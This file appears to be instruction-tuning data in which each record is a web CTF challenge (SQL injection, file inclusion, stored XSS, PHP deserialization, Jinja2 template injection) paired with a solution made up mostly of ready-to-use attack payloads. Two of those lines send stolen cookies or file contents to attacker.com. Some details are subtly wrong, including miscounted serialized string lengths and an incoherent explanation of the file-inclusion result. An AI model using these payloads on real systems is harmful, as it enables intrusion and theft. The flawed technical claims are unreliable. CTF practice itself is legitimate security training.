{"instruction": "Solve this CTF challenge: Login Bypass", "input": "Challenge: The web application has a login page. Find a way to authenticate as admin.\n\nGiven Information:\nURL: http://target.local/login.php\nSource reveals: $query = \"SELECT * FROM users WHERE user='$user' AND pass='$pass'\"", "output": "Identified SQL injection vulnerability in login form.\n\n[ANALYSIS]\n- Password field unsanitized in SQL query\n- Single quotes can break query structure\n- Boolean-based bypass possible\n\n[EXPLOITATION]\nUsername: admin' --\nPassword: anything\n\nThis comments out the password check, returning the admin row.\n\n[FLAG LOCATION]\nAfter login, admin dashboard at /admin/dashboard.php contains flag.\n\n[ALTERNATIVE APPROACHES]\n1. Username: ' OR '1'='1' --\n2. Username: admin'/*\n   Password: */--\n3. Union-based: ' UNION SELECT 'admin','password'--"}
{"instruction": "Solve this CTF challenge: File Inclusion", "input": "Challenge: The site loads pages dynamically. Read the flag at /flag.txt\n\nGiven Information:\nURL: http://target.local/index.php?page=home\nError on invalid page: Warning: include(/var/www/pages/test.php): failed to open stream", "output": "Identified Local File Inclusion (LFI) vulnerability.\n\n[ANALYSIS]\n- Page parameter directly included without validation\n- Full path revealed: /var/www/pages/[input].php\n- PHP extension auto-appended\n\n[EXPLOITATION]\nPath traversal with null byte bypass (PHP < 5.3.4):\n/index.php?page=../../../flag.txt%00\n\nFor modern PHP, use filter wrapper:\n/index.php?page=php://filter/convert.base64-encode/resource=../../../flag.txt\n\nThen decode: echo 'base64_output' | base64 -d\n\n[FLAG EXTRACTION]\nDirect traversal successful: ?page=../../../flag.txt works because the file extension is only added to .php files in the pages directory.\n\n[ADDITIONAL FINDINGS]\n- /etc/passwd readable: ?page=../../../etc/passwd\n- PHP source via filter: ?page=php://filter/convert.base64-encode/resource=index"}
{"instruction": "Solve this CTF challenge: Session Hijacking", "input": "Challenge: Steal the admin's session to access restricted area.\n\nGiven Information:\nXSS found in /comment.php\nAdmin bot visits all new comments\nFlag at /admin/secret.php", "output": "Exploiting Stored XSS for session hijacking.\n\n[ANALYSIS]\n- Comment form vulnerable to XSS\n- Admin bot (with admin cookie) visits comments\n- Need to exfiltrate admin's session cookie\n\n[EXPLOITATION]\nPosted comment with payload:\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>\n\nReceived on attacker server:\nGET /steal?c=PHPSESSID=admin_session_id_here\n\n[SESSION HIJACK]\n1. Set cookie in browser: document.cookie='PHPSESSID=admin_session_id_here'\n2. Navigate to /admin/secret.php\n3. Flag displayed\n\n[ALTERNATIVE PAYLOADS]\n1. Fetch-based: <script>fetch('http://attacker/'+document.cookie)</script>\n2. SVG-based: <svg onload=\"...\">\n3. Img onerror: <img src=x onerror=\"...\">"}
{"instruction": "Solve this CTF challenge: Deserialization", "input": "Challenge: The application uses PHP serialization. Achieve RCE.\n\nGiven Information:\nCookie: user=O:4:\"User\":2:{s:4:\"name\";s:5:\"guest\";s:4:\"role\";s:4:\"user\";}\nSource leaked: class Logger { function __destruct() { exec($this->cmd); }}", "output": "PHP Object Injection leading to RCE.\n\n[ANALYSIS]\n- Cookie contains serialized PHP object\n- Logger class has dangerous __destruct() method\n- cmd property executed on object destruction\n\n[EXPLOITATION]\nCrafted malicious payload:\nO:6:\"Logger\":1:{s:3:\"cmd\";s:27:\"cat /flag.txt > /tmp/pwned\";}\n\nURL encoded for cookie:\nO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A27%3A%22cat%20%2Fflag.txt%20%3E%20%2Ftmp%2Fpwned%22%3B%7D\n\nAfter request, flag written to /tmp/pwned\n\n[FLAG RETRIEVAL]\nUsed LFI to read /tmp/pwned or direct RCE:\nO:6:\"Logger\":1:{s:3:\"cmd\";s:52:\"curl http://attacker.com/?f=$(cat /flag.txt|base64)\";}\n\n[MITIGATION]\n- Never unserialize user input\n- Use JSON instead of PHP serialization\n- Implement __wakeup() validation"}
{"instruction": "Solve this CTF challenge: SSTI", "input": "Challenge: The template engine seems vulnerable. Read /flag.txt\n\nGiven Information:\nURL: /render?name={{7*7}} returns 49\nError message reveals: Jinja2", "output": "Server-Side Template Injection in Jinja2.\n\n[ANALYSIS]\n- {{7*7}} = 49 confirms code execution\n- Jinja2 template engine identified\n- Need to escalate to file read or RCE\n\n[EXPLOITATION]\nPayload for file read:\n{{''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()}}\n\nModern Python 3 payload:\n{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\n\nShorter alternative:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n[FLAG EXTRACTION]\n/render?name={{''.__class__.__bases__[0].__subclasses__()[250]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}\n\n[VARIATIONS]\n- {{self.__init__.__globals__.__builtins__.__import__('os').popen('cmd').read()}}\n- {{lipsum.__globals__['os'].popen('cmd').read()}}\n- {{cycler.__init__.__globals__.os.popen('cmd').read()}}"}
